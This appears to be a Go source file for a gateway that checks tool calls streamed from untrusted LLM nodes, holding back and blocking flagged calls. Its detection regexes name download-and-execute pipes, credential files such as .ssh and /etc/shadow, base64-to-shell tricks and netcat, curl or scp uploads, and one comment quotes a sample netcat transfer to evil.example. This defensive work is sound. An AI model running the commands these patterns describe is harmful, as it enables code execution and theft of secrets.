// Guards on answers from untrusted nodes (decision 0007 addendum). A volunteer can read and
// change what its node answers; an agent such as opencode may run a tool call without a
// person reading it. So tool calls from untrusted nodes are held back until complete and
// checked before the client sees them: download-and-execute, credential files, encoded
// commands, uploads of files, and web addresses that appear nowhere in the request. A
// flagged tool call is never released, and the node is held (gets no requests) until the operator looks.
// Plain text with unknown addresses is only flagged (logged), not blocked.
//
// These are tripwires for crude attacks, not a proof that an answer is honest: a careful
// attacker writes a harmful command that matches no pattern. Answer checking comes later.
//
// SPDX-License-Identifier: Apache-2.0
package gateway

import (
	"encoding/json"
	"net/netip"
	"regexp"
	"strings"
)

// Guard rules, as logged and stored in pause records.
const (
	ruleDownloadExec = "download-and-execute"
	ruleCredentials  = "credential-path"
	ruleEncoded      = "encoded-command"
	ruleUpload       = "file-upload"
	ruleUnknownURL   = "unknown-address"
	ruleTextURL      = "unknown-address-in-text" // flagged only
	// Streams no honest engine sends, built to make the guard and the client see different
	// calls: tool-call pieces after the calls were completed and released, or keys the guard
	// reads exactly while a client's decoder may match them in another case.
	ruleAfterFinish = "tool-call-after-finish"
	ruleOddKey      = "malformed-chunk"
)

// ncAddress is what netcat needs to reach anything before its input: shell words (options, not
// Lean's ":" or ":="), then a host and a port. A port is a number, a range or a variable after
// any word; a service name netcat looks up ("https", "echo") only after a word shaped like a host
// (a dotted name, also one ending in a dot, an IPv4 or IPv6 address, a variable), since a list of names is never complete and a bare
// word after a word is ordinary text. So "nc host 9000 < f" and "nc evil.example echo < f" are
// transfers, while "have nc : a < b", "nc a b < c" and "nc x domain < y" are names and comparisons.
const (
	ncWord    = `(?:-[^\s<>]+|["'\w$\[{][^\s<>|;&]*)`
	ncNumPort = `["']?(?:\d{1,5}(?:-\d{1,5})?|\$\{?\w+\}?)["']?`
	ncHost    = `["']?(?:\$\{?\w+\}?|\[?` + ncIPv6 + `(?:%\w+)?\]?|[\w-]+(?:\.[\w-]+)*\.|[\w-]+(?:\.[\w-]+)+|localhost)["']?`
	// ncIPv6: hex groups and at least two colons, an IPv4 tail allowed, never colons alone. No
	// bound on the groups: a tripwire may take an invalid address, it must not miss a valid one.
	ncIPv6     = `(?:[0-9A-Fa-f]{1,4}:(?:[0-9A-Fa-f]{0,4}:)+(?:[0-9A-Fa-f]{1,4}|` + ncIPv4 + `)?|(?:[0-9A-Fa-f]{0,4}:){2,}(?:[0-9A-Fa-f]{1,4}|` + ncIPv4 + `))`
	ncIPv4     = `\d{1,3}(?:\.\d{1,3}){3}`
	ncName     = `["']?[A-Za-z][\w-]*["']?`
	ncAddress  = `(?:\s+` + ncWord + `)*\s+(?:` + ncWord + `\s+` + ncNumPort + `|` + ncHost + `\s+` + ncName + `)`
	ncAfter    = `(?:\s+-[^\s<>]+|\s*(?:\d?>{1,2}&?|&>{1,2})\s*[^\s<>]+)*` // options and output redirections
	ncRedirect = `\s*\d?<\s*\S`
)

// guardRules match dangerous tool calls. Credential paths are excused when the request
// itself names them ("put the key in .env"): the node cannot add text to the request. why is
// what a hold record keeps to say which pattern fired: fixed text, never the call's own.
var guardRules = []struct {
	rule, why string
	re        *regexp.Regexp
}{
	{ruleDownloadExec, "a download piped into a shell or interpreter", regexp.MustCompile(`(?i)\b(?:curl|wget|fetch|iwr|irm|invoke-webrequest|invoke-restmethod)\b[^\n|;&]*\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:env\s+)?(?:(?:ba|z|da|k|c|tc|fi)?sh|python[0-9.]*|perl|ruby|node|php|iex|invoke-expression)\b`)},
	{ruleDownloadExec, "a shell running a download", regexp.MustCompile(`(?i)\b(?:(?:ba|z|da|k)?sh|source|\.)\s+(?:-c\s+)?["']?(?:<\(|\$\(|` + "`" + `)\s*(?:curl|wget|fetch)\b`)},
	{ruleDownloadExec, "PowerShell running a download", regexp.MustCompile(`(?i)\b(?:iex|invoke-expression)\b[^\n]*\b(?:iwr|irm|invoke-webrequest|invoke-restmethod|downloadstring)\b`)},
	{ruleCredentials, "a credential file or folder the request does not name", regexp.MustCompile(`(?i)(?:^|[\s"'=:(/~])\.(?:ssh|aws|gnupg|kube|docker)(?:/|\b)|\bid_(?:rsa|dsa|ecdsa|ed25519)\b|\.git-credentials\b|(?:^|[\s"'=:(/~])\.netrc\b|/etc/shadow\b|(?:^|[\s"'=:(/~])\.env(?:\.[a-z]+)?(?:$|[\s"'):;,])`)},
	{ruleEncoded, "base64 decoded into a shell or interpreter", regexp.MustCompile(`(?i)\bbase64\s+(?:-d|-D|--decode)\b[^\n]*\|\s*(?:sudo\s+)?(?:(?:ba|z|da|k)?sh|python[0-9.]*|perl|eval)\b`)},
	{ruleEncoded, "a shell running base64-decoded text", regexp.MustCompile(`(?i)\b(?:(?:ba|z|da|k)?sh|eval)\b[^\n]*(?:\$\(|` + "`" + `)[^\n]*\bbase64\s+(?:-d|-D|--decode)\b`)},
	{ruleEncoded, "PowerShell with an encoded command", regexp.MustCompile(`(?i)\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]*\s-(?:e|en|enc|encodedcommand)\s+[A-Za-z0-9+/=]{16,}`)},
	{ruleEncoded, "exec or eval of base64-decoded code", regexp.MustCompile(`(?i)\b(?:exec|eval)\s*\(\s*(?:__import__\(\s*["']base64["']\s*\)\.|base64\.)?b64decode\b`)},
	{ruleUpload, "curl sending a file as form or data", regexp.MustCompile(`\bcurl\b[^\n]*\s(?:-d|--data(?:-binary|-raw|-urlencode)?|-F|--form)\s*["']?(?:[\w.-]+=)?@`)},
	{ruleUpload, "curl uploading a file", regexp.MustCompile(`\bcurl\b[^\n]*\s(?:-T|--upload-file)\s`)},
	{ruleUpload, "wget posting a file", regexp.MustCompile(`\bwget\b[^\n]*--post-file`)},
	{ruleUpload, "netcat sending a file to a host and port", regexp.MustCompile(`\b(?:nc|ncat|netcat)(?:\.\w+)?["']?` + ncAddress + ncAfter + ncRedirect)},
	{ruleUpload, "socat sending a file", regexp.MustCompile(`\bsocat\s(?:[^\n|;&<]|\d*>&|&>)*<\s*\S`)},
	{ruleUpload, "scp or rsync to a remote host", regexp.MustCompile(`\b(?:scp|rsync)\b[^\n]*\s(?:[\w.-]+@)?[A-Za-z0-9.-]+\.[A-Za-z]{2,}:`)},
}

// urlHostRe finds the host of a web address; bareHostRe a host given to curl or wget without
// a scheme.
var (
	urlHostRe  = regexp.MustCompile(`(?i)\b(?:https?|ftp|wss?)://(?:[^\s/@"'<>]*@)?(\[[0-9a-f:.]+\]|[^\s/"'<>?#:\\)\]]+)`)
	bareHostRe = regexp.MustCompile(`(?i)\b(?:curl|wget)\s+(?:-\S+\s+)*([a-z0-9-]+(?:\.[a-z0-9-]+)+)(?:[:/\s"']|$)`)
)

// unknownHost returns the first web address host in s that appears nowhere in the request
// (nor a parent domain of it), ignoring local and private addresses.
func unknownHost(s, req string) string {
	var hosts []string
	for _, m := range urlHostRe.FindAllStringSubmatch(s, -1) {
		hosts = append(hosts, m[1])
	}
	for _, m := range bareHostRe.FindAllStringSubmatch(s, -1) {
		hosts = append(hosts, m[1])
	}
	for _, h := range hosts {
		h = strings.ToLower(strings.Trim(strings.TrimRight(h, ".,;"), "[]"))
		if h == "" || localHost(h) || hostInRequest(h, req) {
			continue
		}
		return h
	}
	return ""
}

func localHost(h string) bool {
	if h == "localhost" || strings.HasSuffix(h, ".localhost") {
		return true
	}
	a, err := netip.ParseAddr(h)
	return err == nil && (a.IsLoopback() || a.IsPrivate() || a.IsUnspecified() || a.IsLinkLocalUnicast())
}

// hostInRequest: the host, or a parent domain with at least two labels, occurs in the
// request text (e.g. "raw.githubusercontent.com" is fine if the user wrote
// "githubusercontent.com").
func hostInRequest(h, req string) bool {
	for {
		if strings.Contains(req, h) {
			return true
		}
		_, parent, ok := strings.Cut(h, ".")
		if !ok || !strings.Contains(parent, ".") {
			return false
		}
		h = parent
	}
}

// requestText is all text of a request a node sees, lowercased, for the address check.
func requestText(body map[string]any) string {
	var b strings.Builder
	eachText(body, func(s string) { b.WriteString(strings.ToLower(s)); b.WriteByte('\n') })
	return b.String()
}

// guardHit is what stopped an answer: the rule and, for the operator's hold record, why it
// fired, in fixed words that name the pattern (guardRules) and hold nothing of the call or the
// request. rule "" means nothing did.
type guardHit struct {
	rule, why string
}

// Reasons of the rules that are not a pattern of guardRules.
const (
	whyUnknownURL  = "a web address that is not in the request"
	whyAfterFinish = "tool-call pieces after the calls were complete"
	whyOddKey      = "a stream key in an unusual case"
)

// streamHit is the hit of a stream rule (guard.violation).
func streamHit(rule string) guardHit {
	switch rule {
	case ruleAfterFinish:
		return guardHit{rule, whyAfterFinish}
	case ruleOddKey:
		return guardHit{rule, whyOddKey}
	}
	return guardHit{rule: rule}
}

var (
	// flatLines makes a text one line, joining shell line continuations first: rules that stop
	// at a line end then see all of a command, and all of a script as the JSON text used to show it.
	flatLines = strings.NewReplacer("\\\r\n", " ", "\\\n", " ", "\r\n", " ", "\n", " ", "\r", " ")
	// flatEscapes does the same for arguments that are not valid JSON.
	flatEscapes = strings.NewReplacer(`\\\n`, " ", `\\n`, " ", `\r`, " ", `\n`, " ", `\t`, " ", `\"`, `"`)
)

// callText is the text the rules read: every key, string and number of the arguments, decoded,
// in order (a key given twice shows both values, whichever one a client takes), as one line.
// Not the JSON itself: in `"cd x\ncat y"` the escape puts the words "ncat" and "nc" where the
// command has none (2 of 4,535 recorded calls, one being Python's `\nc = open(...)`), and
// quoting could hide a pattern. Arguments that do not parse are read as they came.
func callText(name, args string) string {
	if !json.Valid([]byte(args)) {
		return name + "\n" + flatEscapes.Replace(args)
	}
	var b strings.Builder
	d := json.NewDecoder(strings.NewReader(args))
	d.UseNumber()
	for {
		t, err := d.Token()
		if err != nil {
			break
		}
		switch v := t.(type) {
		case string:
			b.WriteString(v)
			b.WriteByte(' ')
		case json.Number:
			b.WriteString(v.String())
			b.WriteByte(' ')
		}
	}
	return name + "\n" + flatLines.Replace(b.String())
}

// checkToolCall returns what a tool call breaks; hit.rule is "" if nothing. The rules read a
// write or edit tool's file text as well as shell commands: a script written now can run in the
// next call, and in 1,032 recorded write and edit calls no rule fired on such text.
func checkToolCall(name, args, req string) guardHit {
	text := callText(name, args)
	for _, r := range guardRules {
		for _, m := range r.re.FindAllStringIndex(text, -1) {
			if r.rule == ruleCredentials && strings.Contains(req, strings.ToLower(strings.Trim(text[m[0]:m[1]], " \t\n\"'=:(/~);,"))) {
				continue
			}
			return guardHit{r.rule, r.why}
		}
	}
	if unknownHost(text, req) != "" {
		return guardHit{ruleUnknownURL, whyUnknownURL}
	}
	return guardHit{}
}

// maxGuardText bounds the answer text kept for the address check, and maxHeldArgs the tool
// call arguments held back per request.
const (
	maxGuardText = 256 << 10
	maxHeldArgs  = 2 << 20
)

// guard follows one streamed answer of an untrusted node.
type guard struct {
	req   string // requestText of the request
	calls []*heldCall
	held  int      // bytes of arguments held
	early [][]byte // chunks before any content (the role): held, so that an answer made only of
	// a flagged tool call has sent nothing yet and can be retried on a trusted node
	begun  bool   // content went out: nothing more is held early
	finish []byte // the chunk with finish_reason, held until the calls are released
	meta   map[string]any
	text   strings.Builder
	// released: tool calls were checked and passed on; more pieces of tool calls after that
	// would be checked apart from what the client joins them to.
	released  bool
	violation string // a stream rule broken (ruleAfterFinish, ruleOddKey): stop the answer
}

type heldCall struct {
	id, typ, name string
	args          strings.Builder
}

func newGuard(req string) *guard { return &guard{req: req} }

// filter takes one streamed chunk and returns what may go to the client now. Tool-call
// deltas are taken out and held; a chunk with finish_reason is held while tool calls are
// pending (release puts it back after them; check first). tooLarge reports held arguments
// beyond maxHeldArgs.
func (gd *guard) filter(raw []byte) (outs [][]byte, tooLarge bool) {
	out, tooLarge := gd.filter1(raw)
	if out == nil || tooLarge {
		return nil, tooLarge
	}
	if !gd.begun && len(gd.early) < 8 && emptyChunk(out) {
		gd.early = append(gd.early, out)
		return nil, false
	}
	gd.begun = true
	outs, gd.early = append(gd.early, out), nil
	return outs, false
}

// emptyChunk: a chunk whose deltas carry nothing but a role (no text, no finish, no usage).
func emptyChunk(raw []byte) bool {
	var c struct {
		Choices []struct {
			Delta        map[string]any `json:"delta"`
			FinishReason *string        `json:"finish_reason"`
		} `json:"choices"`
		Usage any `json:"usage"`
	}
	if json.Unmarshal(raw, &c) != nil || c.Usage != nil || len(c.Choices) == 0 {
		return false
	}
	for _, ch := range c.Choices {
		if ch.FinishReason != nil {
			return false
		}
		for k, v := range ch.Delta {
			if k != "role" && v != nil && v != "" {
				return false
			}
		}
	}
	return true
}

func (gd *guard) filter1(raw []byte) (out []byte, tooLarge bool) {
	var c map[string]any
	if json.Unmarshal(raw, &c) != nil {
		return raw, false
	}
	if oddKey(c) {
		gd.violation = ruleOddKey
		return nil, false
	}
	if gd.meta == nil {
		gd.meta = map[string]any{}
		for _, k := range []string{"id", "object", "created", "model"} {
			if v, ok := c[k]; ok {
				gd.meta[k] = v
			}
		}
	}
	choices, _ := c["choices"].([]any)
	changed, finished, empty := false, false, true
	for _, ch := range choices {
		cm, _ := ch.(map[string]any)
		if cm == nil {
			continue
		}
		delta, _ := cm["delta"].(map[string]any)
		if t, ok := delta["content"].(string); ok && gd.text.Len() < maxGuardText {
			gd.text.WriteString(t)
		}
		if tcs, ok := delta["tool_calls"].([]any); ok {
			if gd.released && len(tcs) > 0 {
				gd.violation = ruleAfterFinish
				return nil, false
			}
			gd.hold(tcs)
			delete(delta, "tool_calls")
			changed = true
		}
		if f, _ := cm["finish_reason"].(string); f != "" {
			finished = true
		}
		for k, v := range delta {
			if k != "role" && v != nil && v != "" {
				empty = false
			}
		}
	}
	if gd.held > maxHeldArgs {
		return nil, true
	}
	if finished && len(gd.calls) > 0 {
		gd.finish, _ = json.Marshal(c)
		return nil, false
	}
	if !changed {
		return raw, false
	}
	if empty && !finished && c["usage"] == nil && len(choices) > 0 {
		return nil, false // only tool-call pieces: nothing to send yet
	}
	out, _ = json.Marshal(c)
	return out, false
}

func (gd *guard) hold(tcs []any) {
	for _, t := range tcs {
		tc, _ := t.(map[string]any)
		if tc == nil {
			continue
		}
		i := 0
		if f, ok := tc["index"].(float64); ok {
			i = int(f)
		}
		if i < 0 || i > 255 {
			continue
		}
		for len(gd.calls) <= i {
			gd.calls = append(gd.calls, &heldCall{typ: "function"})
		}
		k := gd.calls[i]
		if s, _ := tc["id"].(string); s != "" {
			k.id = s
		}
		if s, _ := tc["type"].(string); s != "" {
			k.typ = s
		}
		if fn, _ := tc["function"].(map[string]any); fn != nil {
			if s, _ := fn["name"].(string); s != "" {
				k.name = s
			}
			if s, _ := fn["arguments"].(string); s != "" {
				k.args.WriteString(s)
				gd.held += len(s)
			}
		}
	}
}

// check returns what the held tool calls break; hit.rule is "" if nothing.
func (gd *guard) check() guardHit {
	for _, k := range gd.calls {
		if h := checkToolCall(k.name, k.args.String(), gd.req); h.rule != "" {
			return h
		}
	}
	return guardHit{}
}

// textFlag returns ruleTextURL if the answer text names a web address absent from the request.
func (gd *guard) textFlag() string {
	if unknownHost(gd.text.String(), gd.req) != "" {
		return ruleTextURL
	}
	return ""
}

// release returns the held chunks, the tool calls as one chunk, then the held finish chunk,
// and clears them. Call it only after check passed.
func (gd *guard) release() [][]byte {
	out := gd.early
	gd.early = nil
	if len(gd.calls) > 0 {
		var tcs []any
		for i, k := range gd.calls {
			tcs = append(tcs, map[string]any{"index": i, "id": k.id, "type": k.typ,
				"function": map[string]any{"name": k.name, "arguments": k.args.String()}})
		}
		c := map[string]any{}
		for k, v := range gd.meta {
			c[k] = v
		}
		c["choices"] = []any{map[string]any{"index": 0, "delta": map[string]any{"tool_calls": tcs}, "finish_reason": nil}}
		b, _ := json.Marshal(c)
		out = append(out, b)
	}
	if gd.finish != nil {
		out = append(out, gd.finish)
	}
	gd.released = gd.released || len(gd.calls) > 0
	gd.calls, gd.finish, gd.held = nil, nil, 0
	return out
}

// streamKeys are the chunk keys the guard and the answer assembly read. encoding/json matches
// struct fields case-insensitively, and clients may too, while the guard reads exact keys.
var streamKeys = []string{"choices", "delta", "message", "tool_calls", "function", "arguments", "name",
	"index", "id", "type", "content", "reasoning_content", "finish_reason", "role", "usage"}

// oddKey reports a key anywhere in v that differs from a stream key only in case.
func oddKey(v any) bool {
	switch x := v.(type) {
	case map[string]any:
		for k, e := range x {
			for _, s := range streamKeys {
				if k != s && strings.EqualFold(k, s) {
					return true
				}
			}
			if oddKey(e) {
				return true
			}
		}
	case []any:
		for _, e := range x {
			if oddKey(e) {
				return true
			}
		}
	}
	return false
}

// checkAssembled returns what a tool call in an assembled (non-streaming) answer breaks; hit.rule
// is "" if nothing. The client gets exactly these calls, however the stream was cut into pieces.
func checkAssembled(ans map[string]any, req string) guardHit {
	choices, _ := ans["choices"].([]any)
	for _, ch := range choices {
		cm, _ := ch.(map[string]any)
		msg, _ := cm["message"].(map[string]any)
		calls, _ := msg["tool_calls"].([]any)
		for _, c := range calls {
			fn, _ := c.(map[string]any)["function"].(map[string]any)
			name, _ := fn["name"].(string)
			args, _ := fn["arguments"].(string)
			if h := checkToolCall(name, args, req); h.rule != "" {
				return h
			}
		}
	}
	return guardHit{}
}

// guardError is a tool call stopped by a guard.
type guardError struct{ rule string }

func (e *guardError) Error() string { return "answer stopped by a guard: " + e.rule }
